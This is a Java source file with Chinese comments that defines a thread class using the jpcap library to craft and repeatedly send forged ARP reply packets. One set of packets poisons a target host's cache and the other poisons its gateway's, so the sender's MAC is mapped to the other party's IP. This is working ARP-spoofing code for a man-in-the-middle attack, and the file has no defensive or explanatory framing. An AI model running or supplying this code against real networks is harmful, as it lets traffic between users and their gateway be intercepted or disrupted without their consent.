package test;

import java.net.InetAddress;
import jpcap.packet.*;
import jpcap.*;

public class TrickerThread extends Thread
{  
   
    private String targetIP;
   
    private String gateWayIP;
   
    private byte[] targetMAC;
   
    private byte[] gateWayMAC;
   
    private ARPPacket targetPacket;
   
    private ARPPacket gateWayPacket;
   
    private NetworkInterface device;
   
    private JpcapSender sender = null;
   
    public TrickerThread(NetworkInterface device, JpcapSender sender, String targetIP, String gateWayIP, byte[] targetMAC , byte[] gateWayMAC)
    {
      this.device = device;
      this.sender = sender;
         this.targetIP = targetIP;
         this.gateWayIP = gateWayIP;
         this.targetMAC = targetMAC;
         this.gateWayMAC = gateWayMAC;
        
         makePacket(); 
    }
   
   
    public void run()
    {
     
     sender.sendPacket(targetPacket);
     sender.sendPacket(gateWayPacket);
     System.out.println("欺骗!!");
     try
     {
      Thread.sleep(200);
     }
     catch(Exception e)
     {
      System.out.println();
     }
    }
   
    private void makePacket()
    {
     
     
     
     targetPacket = new ARPPacket();//发往目标主机的ARP包
  targetPacket.hardtype=ARPPacket.HARDTYPE_ETHER;
  targetPacket.prototype=ARPPacket.PROTOTYPE_IP;
  targetPacket.operation=ARPPacket.ARP_REPLY;//REPLY回复型ARP数据包
  targetPacket.hlen=6;
  targetPacket.plen=4;
  targetPacket.sender_hardaddr=device.mac_address;//源MAC地址
  targetPacket.target_hardaddr=targetMAC;//目地MAC地址
  try
  {
   
      targetPacket.sender_protoaddr=InetAddress.getByName(gateWayIP).getAddress();
     
      targetPacket.target_protoaddr=InetAddress.getByName(targetIP).getAddress();
  }catch(Exception e)
  {
   
  }
  
  EthernetPacket ether=new EthernetPacket();
  ether.frametype=EthernetPacket.ETHERTYPE_ARP;
  
  ether.src_mac=device.mac_address;
  
  ether.dst_mac=targetMAC;
  
  targetPacket.datalink=ether;
  
  gateWayPacket = new ARPPacket();//发往网关的ARP数据报
  gateWayPacket.hardtype=ARPPacket.HARDTYPE_ETHER;
  gateWayPacket.prototype=ARPPacket.PROTOTYPE_IP;
  gateWayPacket.operation=ARPPacket.ARP_REPLY;
  gateWayPacket.hlen=6;
  gateWayPacket.plen=4;
  gateWayPacket.sender_hardaddr=device.mac_address;//源MAC地址
  gateWayPacket.target_hardaddr=gateWayMAC;//目标MAC地址
  try
  {
   
      gateWayPacket.sender_protoaddr=InetAddress.getByName(targetIP).getAddress();
     
      gateWayPacket.target_protoaddr=InetAddress.getByName(gateWayIP).getAddress();
  }catch(Exception e)
  {
   
  }
    
  ether=new EthernetPacket();
  ether.frametype=EthernetPacket.ETHERTYPE_ARP;
  ether.src_mac=device.mac_address;//源MAC地址
  ether.dst_mac=gateWayMAC;//目的MAC地址
  gateWayPacket.datalink=ether;
  
    }  
}